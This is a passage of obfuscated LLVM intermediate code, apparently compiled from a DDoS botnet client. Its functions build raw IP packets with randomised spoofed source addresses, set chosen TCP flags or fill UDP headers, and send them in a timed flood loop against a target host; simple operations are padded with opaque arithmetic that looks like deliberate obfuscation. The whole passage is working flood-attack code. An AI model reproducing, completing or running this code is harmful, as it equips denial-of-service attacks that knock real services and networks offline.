  %253 = load i16, i16* %252, align 2
  %254 = zext i16 %253 to i32
  %255 = call zeroext i16 @csum(i16* %250, i32 %254)
  %256 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 7
  store i16 %255, i16* %257, align 2
  %258 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %259 = load i32, i32* %11, align 4
  %260 = sub i32 0, %258
  %261 = sub i32 0, %259
  %262 = add i32 %260, %261
  %263 = sub i32 0, %262
  %264 = add nsw i32 %258, %259
  store i32 %263, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %265

; <label>:265:                                    ; preds = %331, %327, %317, %235
  br label %266

; <label>:266:                                    ; preds = %265
  %267 = load i32, i32* %24, align 4
  %268 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %269 = call i64 @sendto(i32 %267, i8* %187, i64 %184, i32 0, %struct.sockaddr* %268, i32 16)
  %270 = call i32 @rand_cmwc()
  %271 = trunc i32 %270 to i16
  %272 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %273 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %272, i32 0, i32 0
  %274 = bitcast %union.anon.2* %273 to %struct.anon.3*
  %275 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %274, i32 0, i32 0
  store i16 %271, i16* %275, align 2
  %276 = load i32, i32* %10, align 4
  %277 = icmp eq i32 %276, 0
  br i1 %277, label %278, label %280

; <label>:278:                                    ; preds = %266
  %279 = call i32 @rand_cmwc()
  br label %285

; <label>:280:                                    ; preds = %266
  %281 = load i32, i32* %10, align 4
  %282 = trunc i32 %281 to i16
  %283 = call zeroext i16 @htons(i16 zeroext %282) #13
  %284 = zext i16 %283 to i32
  br label %285

; <label>:285:                                    ; preds = %280, %278
  %286 = phi i32 [ %279, %278 ], [ %284, %280 ]
  %287 = trunc i32 %286 to i16
  %288 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %289 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %288, i32 0, i32 0
  %290 = bitcast %union.anon.2* %289 to %struct.anon.3*
  %291 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %290, i32 0, i32 1
  store i16 %287, i16* %291, align 2
  %292 = call i32 @rand_cmwc()
  %293 = trunc i32 %292 to i16
  %294 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 4
  %296 = load i32, i32* %27, align 4
  %297 = call i32 @GetRandomIP(i32 %296)
  %298 = call i32 @htonl(i32 %297) #13
  %299 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i32 0, i32 8
  store i32 %298, i32* %300, align 4
  %301 = bitcast i8* %187 to i16*
  %302 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 2
  %304 = load i16, i16* %303, align 2
  %305 = zext i16 %304 to i32
  %306 = call zeroext i16 @csum(i16* %301, i32 %305)
  %307 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 7
  store i16 %306, i16* %308, align 2
  %309 = load i32, i32* %32, align 4
  %310 = load i32, i32* %18, align 4
  %311 = icmp eq i32 %309, %310
  br i1 %311, label %312, label %318

; <label>:312:                                    ; preds = %285
  %313 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %314 = load i32, i32* %31, align 4
  %315 = icmp sgt i32 %313, %314
  br i1 %315, label %316, label %317

; <label>:316:                                    ; preds = %312
  br label %336

; <label>:317:                                    ; preds = %312
  store i32 0, i32* %32, align 4
  br label %265

; <label>:318:                                    ; preds = %285
  %319 = load i32, i32* %32, align 4
  %320 = add i32 %319, 549612731
  %321 = add i32 %320, 1
  %322 = sub i32 %321, 549612731
  %323 = add i32 %319, 1
  store i32 %322, i32* %32, align 4
  %324 = load i32, i32* %33, align 4
  %325 = load i32, i32* %15, align 4
  %326 = icmp eq i32 %324, %325
  br i1 %326, label %327, label %331

; <label>:327:                                    ; preds = %318
  %328 = load i32, i32* %16, align 4
  %329 = mul nsw i32 %328, 1000
  %330 = call i32 @usleep(i32 %329)
  store i32 0, i32* %33, align 4
  br label %265

; <label>:331:                                    ; preds = %318
  %332 = load i32, i32* %33, align 4
  %333 = sub i32 0, 1
  %334 = sub i32 %332, %333
  %335 = add i32 %332, 1
  store i32 %334, i32* %33, align 4
  br label %265

; <label>:336:                                    ; preds = %316
  %337 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %337)
  br label %338

; <label>:338:                                    ; preds = %336, %141, %135, %130, %73, %62, %51
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %489

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %489

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #2
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %489

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %11, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %78

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %11, align 4
  %64 = sub i32 0, %63
  %65 = add i32 32, %64
  %66 = sub nsw i32 32, %63
  %67 = shl i32 1, %65
  %68 = add i32 %67, 1420137591
  %69 = sub i32 %68, 1
  %70 = sub i32 %69, 1420137591
  %71 = sub nsw i32 %67, 1
  %72 = xor i32 %70, -1
  %73 = and i32 -1, %72
  %74 = xor i32 -1, -1
  %75 = and i32 %70, %74
  %76 = or i32 %73, %75
  %77 = xor i32 %70, -1
  store i32 %76, i32* %19, align 4
  br label %78

; <label>:78:                                     ; preds = %62, %61
  %79 = load i32, i32* %13, align 4
  %80 = sext i32 %79 to i64
  %81 = add i64 40, 9136404878606450798
  %82 = add i64 %81, %80
  %83 = sub i64 %82, 9136404878606450798
  %84 = add i64 40, %80
  %85 = call i8* @llvm.stacksave()
  store i8* %85, i8** %20, align 8
  %86 = alloca i8, i64 %83, align 16
  %87 = bitcast i8* %86 to %struct.iphdr*
  store %struct.iphdr* %87, %struct.iphdr** %21, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = bitcast %struct.iphdr* %88 to i8*
  %90 = getelementptr i8, i8* %89, i64 20
  %91 = bitcast i8* %90 to %struct.tcphdr*
  store %struct.tcphdr* %91, %struct.tcphdr** %22, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %94 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = load i32, i32* %19, align 4
  %97 = call i32 @GetRandomIP(i32 %96)
  %98 = call i32 @htonl(i32 %97) #13
  %99 = load i32, i32* %13, align 4
  %100 = sext i32 %99 to i64
  %101 = add i64 20, -1866086028783618126
  %102 = add i64 %101, %100
  %103 = sub i64 %102, -1866086028783618126
  %104 = add i64 20, %100
  %105 = trunc i64 %103 to i32
  call void @makeIPPacket(%struct.iphdr* %92, i32 %95, i32 %98, i8 zeroext 6, i32 %105)
  %106 = call i32 @rand_cmwc()
  %107 = trunc i32 %106 to i16
  %108 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %109 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %108, i32 0, i32 0
  %110 = bitcast %union.anon.0* %109 to %struct.anon.1*
  %111 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %110, i32 0, i32 0
  store i16 %107, i16* %111, align 4
  %112 = call i32 @rand_cmwc()
  %113 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %114 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %113, i32 0, i32 0
  %115 = bitcast %union.anon.0* %114 to %struct.anon.1*
  %116 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %115, i32 0, i32 2
  store i32 %112, i32* %116, align 4
  %117 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon.0* %118 to %struct.anon.1*
  %120 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %119, i32 0, i32 3
  store i32 0, i32* %120, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon.0* %122 to %struct.anon.1*
  %124 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = xor i16 -241, -1
  %127 = xor i16 %125, %126
  %128 = and i16 %127, %125
  %129 = and i16 %125, -241
  %130 = and i16 %128, 80
  %131 = xor i16 %128, 80
  %132 = or i16 %130, %131
  %133 = or i16 %128, 80
  store i16 %132, i16* %124, align 4
  %134 = load i8*, i8** %12, align 8
  %135 = call i32 @strcmp(i8* %134, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.388, i32 0, i32 0)) #10
  %136 = icmp ne i32 %135, 0
  br i1 %136, label %231, label %137

; <label>:137:                                    ; preds = %78
  %138 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i32 0, i32 0
  %140 = bitcast %union.anon.0* %139 to %struct.anon.1*
  %141 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %140, i32 0, i32 4
  %142 = load i16, i16* %141, align 4
  %143 = xor i16 -513, -1
  %144 = xor i16 %142, %143
  %145 = and i16 %144, %142
  %146 = and i16 %142, -513
  %147 = xor i16 %145, -1
  %148 = xor i16 512, -1
  %149 = xor i16 2597, -1
  %150 = and i16 %147, 2597
  %151 = and i16 %145, %149
  %152 = and i16 %148, 2597
  %153 = and i16 512, %149
  %154 = or i16 %150, %151
  %155 = or i16 %152, %153
  %156 = xor i16 %154, %155
  %157 = or i16 %147, %148
  %158 = xor i16 %157, -1
  %159 = or i16 2597, %149
  %160 = and i16 %158, %159
  %161 = or i16 %156, %160
  %162 = or i16 %145, 512
  store i16 %161, i16* %141, align 4
  %163 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon.0* %164 to %struct.anon.1*
  %166 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %165, i32 0, i32 4
  %167 = load i16, i16* %166, align 4
  %168 = xor i16 -1025, -1
  %169 = xor i16 %167, %168
  %170 = and i16 %169, %167
  %171 = and i16 %167, -1025
  %172 = xor i16 %170, -1
  %173 = xor i16 1024, -1
  %174 = xor i16 -29986, -1
  %175 = and i16 %172, -29986
  %176 = and i16 %170, %174
  %177 = and i16 %173, -29986
  %178 = and i16 1024, %174
  %179 = or i16 %175, %176
  %180 = or i16 %177, %178
  %181 = xor i16 %179, %180
  %182 = or i16 %172, %173
  %183 = xor i16 %182, -1
  %184 = or i16 -29986, %174
  %185 = and i16 %183, %184
  %186 = or i16 %181, %185
  %187 = or i16 %170, 1024
  store i16 %186, i16* %166, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.0* %189 to %struct.anon.1*
  %191 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %190, i32 0, i32 4
  %192 = load i16, i16* %191, align 4
  %193 = xor i16 -257, -1
  %194 = xor i16 %192, %193
  %195 = and i16 %194, %192
  %196 = and i16 %192, -257
  %197 = and i16 %195, 256
  %198 = xor i16 %195, 256
  %199 = or i16 %197, %198
  %200 = or i16 %195, 256
  store i16 %199, i16* %191, align 4
  %201 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.0* %202 to %struct.anon.1*
  %204 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = xor i16 %205, -1
  %207 = xor i16 -4097, -1
  %208 = xor i16 31952, -1
  %209 = or i16 %206, %207
  %210 = or i16 31952, %208
  %211 = xor i16 %209, -1
  %212 = and i16 %211, %210
  %213 = and i16 %205, -4097
  %214 = and i16 %212, 4096
  %215 = xor i16 %212, 4096
  %216 = or i16 %214, %215
  %217 = or i16 %212, 4096
  store i16 %216, i16* %204, align 4
  %218 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon.0* %219 to %struct.anon.1*
  %221 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = xor i16 -2049, -1
  %224 = xor i16 %222, %223
  %225 = and i16 %224, %222
  %226 = and i16 %222, -2049
  %227 = and i16 %225, 2048
  %228 = xor i16 %225, 2048
  %229 = or i16 %227, %228
  %230 = or i16 %225, 2048
  store i16 %229, i16* %221, align 4
  br label %375

; <label>:231:                                    ; preds = %78
  %232 = load i8*, i8** %12, align 8
  %233 = call i8* @strtok(i8* %232, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %233, i8** %23, align 8
  br label %234

; <label>:234:                                    ; preds = %372, %231
  %235 = load i8*, i8** %23, align 8
  %236 = icmp ne i8* %235, null
  br i1 %236, label %237, label %374

; <label>:237:                                    ; preds = %234
  %238 = load i8*, i8** %23, align 8
  %239 = call i32 @strcmp(i8* %238, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.390, i32 0, i32 0)) #10
  %240 = icmp ne i32 %239, 0
  br i1 %240, label %259, label %241

; <label>:241:                                    ; preds = %237
  %242 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.0* %243 to %struct.anon.1*
  %245 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = xor i16 %246, -1
  %248 = xor i16 -513, -1
  %249 = xor i16 -3022, -1
  %250 = or i16 %247, %248
  %251 = or i16 -3022, %249
  %252 = xor i16 %250, -1
  %253 = and i16 %252, %251
  %254 = and i16 %246, -513
  %255 = and i16 %253, 512
  %256 = xor i16 %253, 512
  %257 = or i16 %255, %256
  %258 = or i16 %253, 512
  store i16 %257, i16* %245, align 4
  br label %372

; <label>:259:                                    ; preds = %237
  %260 = load i8*, i8** %23, align 8
  %261 = call i32 @strcmp(i8* %260, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.391, i32 0, i32 0)) #10
  %262 = icmp ne i32 %261, 0
  br i1 %262, label %289, label %263

; <label>:263:                                    ; preds = %259
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon.0* %265 to %struct.anon.1*
  %267 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %266, i32 0, i32 4
  %268 = load i16, i16* %267, align 4
  %269 = xor i16 -1025, -1
  %270 = xor i16 %268, %269
  %271 = and i16 %270, %268
  %272 = and i16 %268, -1025
  %273 = xor i16 %271, -1
  %274 = xor i16 1024, -1
  %275 = xor i16 -604, -1
  %276 = and i16 %273, -604
  %277 = and i16 %271, %275
  %278 = and i16 %274, -604
  %279 = and i16 1024, %275
  %280 = or i16 %276, %277
  %281 = or i16 %278, %279
  %282 = xor i16 %280, %281
  %283 = or i16 %273, %274
  %284 = xor i16 %283, -1
  %285 = or i16 -604, %275
  %286 = and i16 %284, %285
  %287 = or i16 %282, %286
  %288 = or i16 %271, 1024
  store i16 %287, i16* %267, align 4
  br label %371

; <label>:289:                                    ; preds = %259
  %290 = load i8*, i8** %23, align 8
  %291 = call i32 @strcmp(i8* %290, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.392, i32 0, i32 0)) #10
  %292 = icmp ne i32 %291, 0
  br i1 %292, label %307, label %293

; <label>:293:                                    ; preds = %289
  %294 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 0
  %296 = bitcast %union.anon.0* %295 to %struct.anon.1*
  %297 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %296, i32 0, i32 4
  %298 = load i16, i16* %297, align 4
  %299 = xor i16 -257, -1
  %300 = xor i16 %298, %299
  %301 = and i16 %300, %298
  %302 = and i16 %298, -257
  %303 = and i16 %301, 256
  %304 = xor i16 %301, 256
  %305 = or i16 %303, %304
  %306 = or i16 %301, 256
  store i16 %305, i16* %297, align 4
  br label %370

; <label>:307:                                    ; preds = %289
  %308 = load i8*, i8** %23, align 8
  %309 = call i32 @strcmp(i8* %308, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.393, i32 0, i32 0)) #10
  %310 = icmp ne i32 %309, 0
  br i1 %310, label %337, label %311

; <label>:311:                                    ; preds = %307
  %312 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %313 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %312, i32 0, i32 0
  %314 = bitcast %union.anon.0* %313 to %struct.anon.1*
  %315 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %314, i32 0, i32 4
  %316 = load i16, i16* %315, align 4
  %317 = xor i16 -4097, -1
  %318 = xor i16 %316, %317
  %319 = and i16 %318, %316
  %320 = and i16 %316, -4097
  %321 = xor i16 %319, -1
  %322 = xor i16 4096, -1
  %323 = xor i16 -11498, -1
  %324 = and i16 %321, -11498
  %325 = and i16 %319, %323
  %326 = and i16 %322, -11498
  %327 = and i16 4096, %323
  %328 = or i16 %324, %325
  %329 = or i16 %326, %327
  %330 = xor i16 %328, %329
  %331 = or i16 %321, %322
  %332 = xor i16 %331, -1
  %333 = or i16 -11498, %323
  %334 = and i16 %332, %333
  %335 = or i16 %330, %334
  %336 = or i16 %319, 4096
  store i16 %335, i16* %315, align 4
  br label %369

; <label>:337:                                    ; preds = %307
  %338 = load i8*, i8** %23, align 8
  %339 = call i32 @strcmp(i8* %338, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.394, i32 0, i32 0)) #10
  %340 = icmp ne i32 %339, 0
  br i1 %340, label %367, label %341

; <label>:341:                                    ; preds = %337
  %342 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %343 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %342, i32 0, i32 0
  %344 = bitcast %union.anon.0* %343 to %struct.anon.1*
  %345 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %344, i32 0, i32 4
  %346 = load i16, i16* %345, align 4
  %347 = xor i16 -2049, -1
  %348 = xor i16 %346, %347
  %349 = and i16 %348, %346
  %350 = and i16 %346, -2049
  %351 = xor i16 %349, -1
  %352 = xor i16 2048, -1
  %353 = xor i16 -21675, -1
  %354 = and i16 %351, -21675
  %355 = and i16 %349, %353
  %356 = and i16 %352, -21675
  %357 = and i16 2048, %353
  %358 = or i16 %354, %355
  %359 = or i16 %356, %357
  %360 = xor i16 %358, %359
  %361 = or i16 %351, %352
  %362 = xor i16 %361, -1
  %363 = or i16 -21675, %353
  %364 = and i16 %362, %363
  %365 = or i16 %360, %364
  %366 = or i16 %349, 2048
  store i16 %365, i16* %345, align 4
  br label %368

; <label>:367:                                    ; preds = %337
  br label %368

; <label>:368:                                    ; preds = %367, %341
  br label %369

; <label>:369:                                    ; preds = %368, %311
  br label %370

; <label>:370:                                    ; preds = %369, %293
  br label %371

; <label>:371:                                    ; preds = %370, %263
  br label %372

; <label>:372:                                    ; preds = %371, %241
  %373 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %373, i8** %23, align 8
  br label %234

; <label>:374:                                    ; preds = %234
  br label %375

; <label>:375:                                    ; preds = %374, %137
  %376 = call i32 @rand_cmwc()
  %377 = trunc i32 %376 to i16
  %378 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 0
  %380 = bitcast %union.anon.0* %379 to %struct.anon.1*
  %381 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %380, i32 0, i32 5
  store i16 %377, i16* %381, align 2
  %382 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 0
  %384 = bitcast %union.anon.0* %383 to %struct.anon.1*
  %385 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %384, i32 0, i32 6
  store i16 0, i16* %385, align 4
  %386 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %387 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %386, i32 0, i32 0
  %388 = bitcast %union.anon.0* %387 to %struct.anon.1*
  %389 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %388, i32 0, i32 7
  store i16 0, i16* %389, align 2
  %390 = load i32, i32* %9, align 4
  %391 = icmp eq i32 %390, 0
  br i1 %391, label %392, label %394

; <label>:392:                                    ; preds = %375
  %393 = call i32 @rand_cmwc()
  br label %399

; <label>:394:                                    ; preds = %375
  %395 = load i32, i32* %9, align 4
  %396 = trunc i32 %395 to i16
  %397 = call zeroext i16 @htons(i16 zeroext %396) #13
  %398 = zext i16 %397 to i32
  br label %399

; <label>:399:                                    ; preds = %394, %392
  %400 = phi i32 [ %393, %392 ], [ %398, %394 ]
  %401 = trunc i32 %400 to i16
  %402 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 0
  %404 = bitcast %union.anon.0* %403 to %struct.anon.1*
  %405 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %404, i32 0, i32 1
  store i16 %401, i16* %405, align 2
  %406 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %407 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %408 = call zeroext i16 @tcpcsum(%struct.iphdr* %406, %struct.tcphdr* %407)
  %409 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 0
  %411 = bitcast %union.anon.0* %410 to %struct.anon.1*
  %412 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %411, i32 0, i32 6
  store i16 %408, i16* %412, align 4
  %413 = bitcast i8* %86 to i16*
  %414 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 2
  %416 = load i16, i16* %415, align 2
  %417 = zext i16 %416 to i32
  %418 = call zeroext i16 @csum(i16* %413, i32 %417)
  %419 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 7
  store i16 %418, i16* %420, align 2
  %421 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %422 = load i32, i32* %10, align 4
  %423 = sub i32 %421, -551592952
  %424 = add i32 %423, %422
  %425 = add i32 %424, -551592952
  %426 = add nsw i32 %421, %422
  store i32 %425, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %427

; <label>:427:                                    ; preds = %480, %479, %399
  br label %428

; <label>:428:                                    ; preds = %427
  %429 = load i32, i32* %17, align 4
  %430 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %431 = call i64 @sendto(i32 %429, i8* %86, i64 %83, i32 0, %struct.sockaddr* %430, i32 16)
  %432 = load i32, i32* %19, align 4
  %433 = call i32 @GetRandomIP(i32 %432)
  %434 = call i32 @htonl(i32 %433) #13
  %435 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 8
  store i32 %434, i32* %436, align 4
  %437 = call i32 @rand_cmwc()
  %438 = trunc i32 %437 to i16
  %439 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 3
  store i16 %438, i16* %440, align 4
  %441 = call i32 @rand_cmwc()
  %442 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 0
  %444 = bitcast %union.anon.0* %443 to %struct.anon.1*
  %445 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %444, i32 0, i32 2
  store i32 %441, i32* %445, align 4
  %446 = call i32 @rand_cmwc()
  %447 = trunc i32 %446 to i16
  %448 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 0
  %450 = bitcast %union.anon.0* %449 to %struct.anon.1*
  %451 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %450, i32 0, i32 0
  store i16 %447, i16* %451, align 4
  %452 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %453 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %452, i32 0, i32 0
  %454 = bitcast %union.anon.0* %453 to %struct.anon.1*
  %455 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %454, i32 0, i32 6
  store i16 0, i16* %455, align 4
  %456 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %457 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %458 = call zeroext i16 @tcpcsum(%struct.iphdr* %456, %struct.tcphdr* %457)
  %459 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 0
  %461 = bitcast %union.anon.0* %460 to %struct.anon.1*
